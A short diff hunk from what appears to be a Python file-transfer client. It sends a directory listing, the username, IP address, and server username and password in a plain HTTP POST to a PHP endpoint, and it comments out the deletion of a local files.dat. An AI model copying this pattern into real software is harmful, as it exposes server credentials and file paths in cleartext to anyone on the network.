@@ -55,7 +55,7 @@ while auth != 1 and attempts != 0:
         for files in all_files:
             dir_str = dir_str + "," + (files.replace(str(os.getcwd()),""))
         response = requests.post("http://"+localhost+"/direcctorylist.php", data = {'list':dir_str,'username':username,'ipaddr':ipaddr,'location':os.getcwd(),'server_user':server_user,'server_pass':server_pass,'port':port})
-        os.remove("files.dat")
+        #os.remove("files.dat")
         #downloader()
         #print(dir_str)
         downloader()
